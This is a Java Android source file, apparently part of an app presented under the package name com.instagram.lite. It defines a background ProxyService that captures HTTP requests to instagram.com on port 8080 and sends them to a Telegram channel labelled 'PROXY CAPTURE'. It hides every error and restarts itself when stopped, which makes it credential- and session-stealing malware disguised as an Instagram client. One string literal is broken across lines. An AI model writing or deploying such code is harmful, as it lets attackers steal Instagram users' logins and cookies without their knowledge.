package com.instagram.lite;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.*;

public class ProxyService extends Service {
    @Override public int onStartCommand(Intent i, int f, int id) {
        new Thread(() -> {
            try {
                ServerSocket server = new ServerSocket(8080);
                while(true) {
                    Socket client = server.accept();
                    new Thread(() -> {
                        try {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                            String line;
                            StringBuilder req = new StringBuilder();
                            while((line = reader.readLine()) != null && !line.isEmpty()) {
                                req.append(line).append("
");
                            }
                            if (req.toString().contains("instagram.com")) {
                                new TelegramService().sendMessage("📡 PROXY CAPTURE:\n" + req.toString());
                            }
                            client.close();
                        } catch(Exception e) {}
                    }).start();
                }
            } catch(Exception e) {}
        }).start();
        return START_STICKY;
    }
    
    @Override public IBinder onBind(Intent i) { return null; }
}